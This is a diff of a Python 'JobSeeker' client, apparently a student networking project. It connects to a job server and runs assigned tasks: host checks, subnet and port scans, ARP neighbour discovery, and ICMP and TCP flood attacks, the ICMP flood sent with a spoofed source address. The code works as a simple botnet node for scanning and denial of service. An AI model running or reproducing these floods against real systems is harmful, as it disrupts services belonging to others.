@@ -9,46 +9,48 @@ from scapy.all import *
 from os import path
 
 class JobSeeker():
-     def __init__(self):
-        #  try:
-          fileNumber = 1
-          while(path.exists(f"Seeker{fileNumber}.log")): #checks if file exist
-               fileNumber += 1
+     # Connects the to JobCreator and initializes UI and other class variables
+     def __init__(self, target_ip = socket.gethostbyname(socket.gethostname())):
+          try:
+               fileNumber = 1
+               while(path.exists(f"Seeker{fileNumber}.log")): #checks if file exist
+                    fileNumber += 1
         
-          self.file = open(f"Seeker{fileNumber}.log", 'w') #redirects stdout from console to file
+               self.file = open(f"Seeker{fileNumber}.log", 'w') #redirects stdout from console to file
 
-          self.PORT = 6000
-          self.SERVER = socket.gethostbyname(socket.gethostname()) # Get IP
-          self.ADDR = (self.SERVER, self.PORT) 
-          self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create client socket   
-          self.conn.connect(self.ADDR) # Connects socket to remote host
-          self.root = tk.Tk()
-          self.create_widgets()
+               self.PORT = 6000
+               self.SERVER = target_ip
+               self.ADDR = (self.SERVER, self.PORT) 
+               self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create client socket   
+               self.conn.connect(self.ADDR) # Connects socket to remote host
+               self.root = tk.Tk()
+               self.create_widgets()
 
           
-          self.add_text(f"Connected to server @ {self.ADDR}\n")
-          self.val = "y"
-          self.FLOOD_AMOUNT = 10 #FLOOD_AMOUNT * 1000 = Number of packets sent by each bot
+               self.add_text(f"Connected to server @ {self.ADDR}\n")
+               self.val = "y"
+               self.FLOOD_AMOUNT = 10 #FLOOD_AMOUNT * 1000 = Number of packets sent by each bot
 
-          # --- Shared Messages ---
+               # --- Shared Messages ---
 
-          self.DISCONNECT =        "disconnect"
-          self.JOB_REQUEST =       "jobrequest"
-          self.JOB_REPORT =        "jobreport"
-          self.JOB_COMPLETE =      "completed"
-          self.JOB_INCOMPLETE =    "incomplete"
-          self.JOB_ASSIGNMENT =    "assignment"
-          self.JOB_SUCCESS =       "success"
-          self.JOB_FAILURE =       "failure"
-          self.COMPLETION_ACK =    "goodjob"
+               self.DISCONNECT =        "disconnect"
+               self.JOB_REQUEST =       "jobrequest"
+               self.JOB_REPORT =        "jobreport"
+               self.JOB_COMPLETE =      "completed"
+               self.JOB_INCOMPLETE =    "incomplete"
+               self.JOB_ASSIGNMENT =    "assignment"
+               self.JOB_SUCCESS =       "success"
+               self.JOB_FAILURE =       "failure"
+               self.COMPLETION_ACK =    "goodjob"
 
-          self.root.mainloop()
-        #  except:
-              # self.file.write("Connection Failed")
-              # sys.exit(0)
+               self.root.mainloop()
+          except:
+               self.file.write("Connection Failed")
+               sys.exit(0)
 
      # --- Function Definitions ---
 
+     # Creates the UI of the JobSeeker
      def create_widgets(self):
           self.window = tk.Frame(self.root)
           self.label = tk.Label(self.window, text = self.conn.getsockname())
@@ -62,16 +64,19 @@ class JobSeeker():
           self.get_job.pack()
           self.quit.pack()
 
+     # Creates a new thread to send the JobRequest to the JobCreator
      def request_job(self):
           # Creates a thread to prevent GUI from not responding if given a one-to-many job
           # Double array is needed to pass otherwise it is sent as a String
           thread = threading.Thread(target = self.send, args = [[ self.JOB_REQUEST ]])
           thread.start()
 
+     # Sends a disconnect message to tje JobCreator and destroys the UI
      def disconnect(self):
           self.send([ self.DISCONNECT ])
           self.root.destroy()
 
+     # Adds text to the display area of the UI
      def add_text(self, text):
           self.display["state"] = 'normal'
           self.display.insert(tk.INSERT, text)
@@ -81,7 +86,8 @@ class JobSeeker():
           self.file.flush()
           self.root.update()
 
-     def send(self, v): # Function to send messages to the server
+     # Function to send messages to the server
+     def send(self, v): 
           # Pickle the message
           self.get_job["state"] = "disabled"
           m = pickle.dumps(v)
@@ -113,7 +119,8 @@ class JobSeeker():
                elif v[0] == self.COMPLETION_ACK:
                     self.add_text("Server @ {0} acknowledged completion\n".format(self.ADDR))
           self.get_job["state"] = "normal"
-        
+      
+     # Check if Online job
      def job1(self, v):
           self.add_text("\nWorking on job 1 for @ {0}\n".format(self.ADDR))
           host = v[2]
@@ -126,7 +133,8 @@ class JobSeeker():
           else:
                self.add_text("The host @ {0} is online.\n".format(host))
                self.send([ self.JOB_REPORT, self.JOB_COMPLETE, self.JOB_SUCCESS ])
-        
+     
+     # Live IP addresses 
      def job2(self, v):
           self.add_text(f"Working on job 2 for @ {self.ADDR}\n")
           subnet = v[2]
@@ -145,7 +153,8 @@ class JobSeeker():
                self.add_text("Live IP Addresses: " + str(IPs)+"\n")
                self.send([ self.JOB_REPORT, self.JOB_COMPLETE, self.JOB_SUCCESS ])
     
-     def job3(self, v): #ICMP Flood
+     #ICMP Flood
+     def job3(self, v):
           self.add_text(f"ICMP attack commencing on {v[2]} for @ {self.ADDR}\n")
           try:
                ip_layer = IP(dst=v[2], src='192.168.2.1')
@@ -155,8 +164,9 @@ class JobSeeker():
                self.send([ self.JOB_REPORT, self.JOB_COMPLETE, self.JOB_SUCCESS ])
           except:
                self.send([ self.JOB_REPORT, self.JOB_COMPLETE, self.JOB_FAILURE ])
-
-     def job4(self, v): #TCP flood attack
+     
+     #TCP flood attack 
+     def job4(self, v): 
           target = v[2]
           port = v[3]
           self.add_text(f"Commencing TCP flood attack on {target} for {self.ADDR}\n")
@@ -173,7 +183,7 @@ class JobSeeker():
           except:
                self.send([ self.JOB_REPORT, self.JOB_COMPLETE, self.JOB_FAILURE ]) 
 
-     # extra job created for practice
+    # Checks Status of a Port
      def job5(self, v):
           self.add_text(f"\nWorking on job 5 for @ {self.ADDR}\n")
           host = v[2]
@@ -275,6 +285,7 @@ class JobSeeker():
          # Get neighbour ips and mac addresses
          for sent, rec in res:
              neighbours.append("IP: " + rec.psrc+ ", MAC: " + rec.hwsrc)
+
          if not neighbours:
              self.add_text("No neighbours in the same LAN ")
              self.send([self.JOB_REPORT, self.JOB_COMPLETE, self.JOB_FAILURE])
@@ -283,4 +294,8 @@ class JobSeeker():
              self.send([self.JOB_REPORT, self.JOB_COMPLETE, self.JOB_SUCCESS])
 
 if __name__ == '__main__':
-     jobC = JobSeeker()
+     # Checks if an IP is given to connect to
+     if(len(sys.argv) > 1):
+          jobS = JobSeeker(sys.argv[1])
+     else:
+          jobS = JobSeeker()
